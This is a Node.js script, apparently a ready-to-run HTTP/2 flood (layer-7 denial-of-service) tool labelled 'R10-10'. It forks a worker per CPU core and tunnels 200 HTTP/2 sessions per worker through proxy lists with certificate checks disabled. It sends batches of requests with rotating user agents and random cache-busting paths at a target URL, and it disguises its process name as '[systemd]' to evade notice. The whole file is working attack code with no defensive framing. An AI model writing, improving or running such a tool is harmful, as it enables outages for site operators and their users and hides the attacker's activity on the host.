// R10-10: LOW-CPU-OPTIMIZED - Maximum Efficiency
// Focus: Minimal CPU usage, Maximum throughput
// Technique: Event loop optimization + Connection pooling

const http2 = require('http2');
const tls = require('tls');
const net = require('net');
const fs = require('fs');
const cluster = require('cluster');
const os = require('os');

const CPU_CORES = os.cpus().length;
let proxies = [];
let userAgents = [];

// Load proxies and user agents
try {
    proxies = fs.readFileSync('proxy.txt', 'utf-8').split('\n')
        .map(line => line.trim())
        .filter(line => line && !line.startsWith('#') && line.includes(':'));
    console.log(`[R10-10] Loaded ${proxies.length} proxies`);
} catch (e) {
    console.log('[R10-10] No proxy.txt found, running without proxies');
}

try {
    userAgents = fs.readFileSync('ua.txt', 'utf-8').split('\n')
        .map(line => line.trim())
        .filter(line => line && !line.startsWith('#'));
    console.log(`[R10-10] Loaded ${userAgents.length} user agents`);
} catch (e) {
    console.log('[R10-10] No ua.txt found, using default UAs');
    userAgents = [
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
        'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36'
    ];
}

// Pre-compute paths
const PRE_COMPUTED_PATHS = [];
for (let i = 0; i < 10000; i++) {
    PRE_COMPUTED_PATHS.push(`/${Math.random().toString(36).substring(7)}/${i}`);
}

if (cluster.isMaster) {
    console.log(`[R10-10] LOW-CPU OPTIMIZED launching on ${CPU_CORES} cores`);
    
    // Set process priority to lowest
    try {
        process.title = '[systemd]';
        process.setPriority(19);
    } catch (e) {}
    
    for (let i = 0; i < CPU_CORES; i++) cluster.fork();
    
    setTimeout(() => process.exit(0), process.argv[3] * 1000 || 300);
} else {
    // Lower this process priority
    try {
        process.setPriority(19); // Lowest priority
    } catch (e) {}
    
    const target = new URL(process.argv[2]);
    const time = process.argv[3] || 300;
    
    let requestCount = 0;
    let sessionIndex = 0;
    
    // Optimized connection pool
    const poolSize = 200;
    const sessions = [];
    
    (async () => {
        for (let i = 0; i < poolSize; i++) {
            try {
                let session;
                
                if (proxies.length > 0) {
                    const proxy = proxies[i % proxies.length];
                    const [proxyHost, proxyPort] = proxy.split(':');
                    
                    const socket = net.connect(parseInt(proxyPort), proxyHost, () => {
                        socket.write(`CONNECT ${target.hostname}:443 HTTP/1.1\r\nHost: ${target.hostname}:443\r\n\r\n`);
                        
                        socket.once('data', () => {
                            const tlsSocket = tls.connect({
                                socket: socket,
                                servername: target.hostname,
                                rejectUnauthorized: false,
                                ALPNProtocols: ['h2']
                            }, () => {
                                const session = http2.connect(target.origin, {
                                    createConnection: () => tlsSocket,
                                    settings: {
                                        enablePush: false,
                                        initialWindowSize: 65535
                                    }
                                });
                                
                                session.on('error', () => {});
                                session.on('goaway', () => {});
                                sessions.push(session);
                            });
                        });
                    });
                } else {
                    session = http2.connect(target.origin, {
                        rejectUnauthorized: false,
                        settings: {
                            enablePush: false,
                            initialWindowSize: 65535
                        }
                    });
                    
                    session.on('error', () => {});
                    session.on('goaway', () => {});
                    sessions.push(session);
                }
            } catch (e) {}
            
            await new Promise(r => setTimeout(r, 100));
        }
    })();
    
    // Batch processing - most efficient
    const BATCH_SIZE = 500;
    let batch = [];
    
    function processBatch() {
        if (batch.length === 0) return;
        
        const currentBatch = batch;
        batch = [];
        
        for (let i = 0; i < currentBatch.length; i++) {
            const idx = currentBatch[i];
            const session = sessions[idx % sessions.length];
            
            if (!session || session.destroyed) continue;
            
            try {
                const ua = userAgents[Math.floor(Math.random() * userAgents.length)];
                const path = PRE_COMPUTED_PATHS[Math.floor(Math.random() * PRE_COMPUTED_PATHS.length)];
                
                const headers = {
                    ':path': path,
                    'user-agent': ua,
                    'accept': 'text/html,*/*',
                    'cache-control': 'no-cache'
                };
                
                const req = session.request(headers);
                req.on('error', () => {});
                req.end();
                requestCount++;
            } catch (e) {}
        }
        
        setImmediate(processBatch);
    }
    
    setTimeout(() => {
        // Queue requests efficiently
        const interval = setInterval(() => {
            for (let i = 0; i < BATCH_SIZE; i++) {
                batch.push(sessionIndex++);
            }
            
            if (batch.length >= BATCH_SIZE) {
                processBatch();
            }
        }, 200);
        
        // Stats (minimal CPU)
        const statsInterval = setInterval(() => {
            console.log(`[R10-10] RPS: ${requestCount} | Memory: ${Math.round(process.memoryUsage().heapUsed / 1024 / 1024)}MB | Sessions: ${sessions.length}`);
            requestCount = 0;
        }, 1000);
        
        // Clean shutdown
        setTimeout(() => {
            clearInterval(interval);
            clearInterval(statsInterval);
            sessions.forEach(s => {
                try { s.destroy(); } catch (e) {}
            });
            process.exit(0);
        }, time * 1000);
    }, 5000);
}